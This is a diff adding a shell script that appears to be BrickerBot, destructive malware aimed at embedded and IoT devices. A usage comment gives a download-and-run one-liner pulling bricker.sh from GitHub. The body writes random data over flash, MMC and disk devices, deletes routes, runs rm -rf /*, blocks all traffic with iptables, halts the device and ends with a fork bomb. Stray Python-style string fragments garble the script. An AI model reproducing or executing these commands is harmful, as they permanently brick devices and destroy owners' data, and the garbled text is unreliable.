@@ -1,0 +1,6 @@
+#!/bin/sh
+
+# How to use: 
+# cd /tmp || cd /var/tmp; busybox wget https://github.com/Frosts420/BrickerBot/bricker.sh || wget https://github.com/Frosts420/BrickerBot/bricker.sh; chmod 777 *; sh || bash; ./bricker.sh
+
+cat /proc/mounts\ncat /dev/urandom | mtd_write mtd0 - 0 32768\ncat /dev/urandom | mtd_write mtd1 - 0 32768\n' ii11II += 'busybox cat /dev/urandom >/dev/mtd0 &\nbusybox cat /dev/urandom >/dev/sda &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtdblock0 &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 &\n' ii11II += 'busybox route del default\ncat /dev/urandom >/dev/mtdblock0 &\ncat /dev/urandom >/dev/mtdblock1 &\ncat /dev/urandom >/dev/mtdblock2 &\ncat /dev/urandom >/dev/mtdblock3 &\ncat /dev/urandom >/dev/mtdblock4 &\ncat /dev/urandom >/dev/mtdblock5 &\ncat /dev/urandom >/dev/mmcblk0 &\ncat /dev/urandom >/dev/mmcblk0p9 &\ncat /dev/urandom >/dev/mmcblk0p12 &\ncat /dev/urandom >/dev/mmcblk0p13 &\ncat /dev/urandom >/dev/root &\ncat /dev/urandom >/dev/mmcblk0p8 &\ncat /dev/urandom >/dev/mmcblk0p16 &\n' ii11II += 'route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null &\niptables -F;iptables -t nat -F;iptables -A INPUT -j DROP;iptables -A FORWARD -j DROP\nhalt -n -f\nreboot\n; while true; do :() { :|:& };:; done
